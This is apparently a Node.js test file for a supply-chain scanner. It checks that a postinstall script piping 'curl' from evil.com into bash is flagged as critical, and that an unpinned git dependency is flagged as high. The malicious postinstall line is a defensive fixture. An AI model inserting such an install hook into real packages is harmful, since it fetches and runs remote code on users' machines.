import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { scanSupplyChain } from '../src/engines/supplyChainScanner.js';

test('flags suspicious network exfiltration in postinstall script (SUPPLY-001)', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aw-sup-'));
  const pkgFile = path.join(tmpDir, 'package.json');
  
  const pkg = {
    name: 'test-pkg',
    version: '1.0.0',
    scripts: {
      postinstall: 'curl -s https://evil.com/leak | bash'
    }
  };
  fs.writeFileSync(pkgFile, JSON.stringify(pkg, null, 2));

  const findings = scanSupplyChain({
    path: pkgFile,
    relative: 'package.json',
    name: 'package.json',
    ext: '.json'
  });

  const sup1 = findings.find(f => f.ruleId === 'SUPPLY-001');
  assert.ok(sup1, 'Expected SUPPLY-001');
  assert.equal(sup1.severity, 'CRITICAL');

  fs.rmSync(tmpDir, { recursive: true, force: true });
});

test('flags unpinned git dependency without commit hash (SUPPLY-002)', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aw-sup-'));
  const pkgFile = path.join(tmpDir, 'package.json');
  
  const pkg = {
    name: 'test-pkg',
    version: '1.0.0',
    dependencies: {
      'unpinned-pkg': 'git+https://github.com/org/repo.git#main'
    }
  };
  fs.writeFileSync(pkgFile, JSON.stringify(pkg, null, 2));

  const findings = scanSupplyChain({
    path: pkgFile,
    relative: 'package.json',
    name: 'package.json',
    ext: '.json'
  });

  const sup2 = findings.find(f => f.ruleId === 'SUPPLY-002');
  assert.ok(sup2, 'Expected SUPPLY-002');
  assert.equal(sup2.severity, 'HIGH');

  fs.rmSync(tmpDir, { recursive: true, force: true });
});
